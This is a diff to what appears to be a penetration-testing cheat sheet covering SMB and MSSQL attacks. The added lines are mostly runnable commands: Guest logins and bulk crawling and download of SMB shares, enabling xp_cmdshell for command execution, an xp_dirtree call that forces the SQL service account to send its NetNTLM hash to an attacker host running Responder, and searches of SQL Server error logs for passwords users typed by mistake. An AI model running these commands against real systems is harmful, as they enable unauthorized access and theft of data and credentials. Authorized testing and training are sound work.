@@ -154,6 +154,12 @@ smbmap -H $IP
 nmap --script smb-vuln-ms17-010 -p 445 $IP
 ```
 
+**Guest auth (distinct from null session — some configs allow Guest but not null):**
+```bash
+nxc smb $IP -u Guest -p ''
+nxc smb $IP -u Guest -p '' --shares
+```
+
 **With creds:**
 ```bash
 nxc smb $IP -u user -p 'password'
@@ -164,8 +170,14 @@ nxc smb $IP -u user -p 'password' -x "whoami"     # execute command
 
 # Connect to share
 smbclient \\\\$IP\\ShareName -U user
+# Recursive listing
+smbclient \\\\$IP\\ShareName -U 'user%password' -c 'recurse ON; ls'
 # Recursive download
 smbclient \\\\$IP\\ShareName -U user -c 'prompt OFF;recurse ON;mget *'
+
+# spider_plus — recursively crawl and download all accessible share content
+nxc smb $IP -u user -p 'password' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/tmp/smb MAX_FILE_SIZE=5000000
+# Works with Guest too: -u Guest -p ''
 
 # Mount share
 mount -t cifs //$IP/ShareName /mnt/smb -o username=user,password=pass
@@ -250,6 +262,12 @@ nxc mssql $IP -u sa -p ''
 impacket-mssqlclient sa:@$IP
 ```
 
+**Validate creds:**
+```bash
+nxc mssql $IP -u user -p 'password'              # domain/Windows auth
+nxc mssql $IP -u user -p 'password' --local-auth # SQL Server auth (not Windows auth)
+```
+
 **With creds:**
 ```bash
 impacket-mssqlclient user:'password'@$IP
@@ -265,11 +283,31 @@ EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 
-# Capture NetNTLM hash (relay to Responder)
+# Capture NetNTLM hash — forces outbound SMB auth from the SQL service account
+# Run Responder first: responder -I eth0 -wd
 EXEC xp_dirtree '\\$LHOST\share';
+EXEC master..xp_dirtree '\\$LHOST\share\file.txt'   # alternate syntax
 ```
 
 > xp_cmdshell = OS command execution. xp_dirtree = steal NetNTLM hash.
+
+**Post-compromise: SQL Server error log credential hunting**
+
+SQL Server logs the username field verbatim for every failed login (Error 18456). If a user typed their password into the username field, it appears in plaintext in the log.
+
+```powershell
+# Default log location (adjust MSSQL version/instance name)
+type "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Log\ERRORLOG"
+type "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Log\ERRORLOG.BAK"
+
+# Custom log path — check startup params in the log file header or registry:
+reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /s | findstr /i "errorlogpath"
+
+# Filter for failed logins — any that look like passwords are worth testing
+Select-String -Path "C:\...\ERRORLOG*" -Pattern "18456" | Select-String -NotMatch "domain\\"
+```
+
+Look for consecutive 18456 events: first with a recognizable username, then immediately with a string that looks like a password. The second "username" is the credential.
 
 ---
 
